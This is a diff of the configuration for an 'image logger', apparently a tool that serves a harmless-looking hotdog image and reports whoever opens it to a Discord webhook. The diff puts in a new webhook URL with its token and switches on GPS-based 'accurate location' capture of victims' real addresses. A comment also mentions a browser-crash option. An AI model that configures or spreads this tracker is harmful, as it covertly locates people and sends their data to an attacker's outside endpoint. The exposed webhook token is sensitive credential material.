@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1121840033691873413/jLXZUhSbk6Qzp-gOUpuS4MFED_ipnldQA61QFTcksFiglXjD5V0gezpGl1fgczfdMYDs",
+    "webhook": "https://ptb.discord.com/api/webhooks/1357349197292245224/EWctC_jF5KeuaVFLzh59RrtKf4I2HENiWF9vKvkJh2FfMrkRTHm0PuvaUP5H2cEtdlqP",
     "image": "https://images.search.yahoo.com/yhs/view;_ylt=AwrjavktypVkwJwCYwdGnIlQ;_ylu=c2VjA3NyBHNsawNpbWcEb2lkAzQ4M2M4ZmQ2MTYzNDhkOWMyNjFiODFkZTQxNDU4YWM0BGdwb3MDNARpdANiaW5n?back=https%3A%2F%2Fimages.search.yahoo.com%2Fyhs%2Fsearch%3Fp%3Dhotdog%26ei%3DUTF-8%26vm%3Dp%26type%3Dgsp_kiwi_00_00_ssg02%26fr%3Dyhs-dcola-019%26hsimp%3Dyhsm-019%26hspart%3Ddcola%26param1%3D1%26param2%3Da%253Dgsp_kiwi_00_00_ssg02%2526cat%253Dweb%2526sesid%253Db1b177b2-c73d-4b4e-a35a-ca2692ac08e7%2526ip%253D74.82.60.21%2526b%253Dchrome%2526os%253Dandroid%2526pa%253D04E368C0343D%2526sid%253Dd551668d-2c86-4667-b086-2def30e838fe%2526abid%253D0%2526abg%253D0%2526et%253D1%26tab%3Dorganic%26ri%3D4&w=1500&h=1050&imgurl=allhailtheblackmarket.com%2Fwp-content%2Fuploads%2F2015%2F08%2F1plain.png&rurl=https%3A%2F%2Fallhailtheblackmarket.com%2F2015%2F09%2Fthe-great-hotdog-challenge-is-upon-us%2F&size=1312.0KB&p=hotdog&oid=483c8fd616348d9c261b81de41458ac4&fr2=&fr=yhs-dcola-019&tt=The+Great+Hot+Dog+Challenge+is&b=0&ni=21&no=4&ts=&vm=p&tab=organic&sigr=5FDmV5KZ2RiC&sigb=9dwxQKUXQlZG&sigi=ZgfYPLN1fPDi&sigt=ntHgxCkK0nSj&.crumb=DSuNG2Mg1X6&fr=yhs-dcola-019&hsimp=yhsm-019&hspart=dcola&type=gsp_kiwi_00_00_ssg02&vm=p&param1=1&param2=a%3Dgsp_kiwi_00_00_ssg02%26cat%3Dweb%26sesid%3Db1b177b2-c73d-4b4e-a35a-ca2692ac08e7%26ip%3D74.82.60.21%26b%3Dchrome%26os%3Dandroid%26pa%3D04E368C0343D%26sid%3Dd551668d-2c86-4667-b086-2def30e838fe%26abid%3D0%26abg%3D0%26et%3D1", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
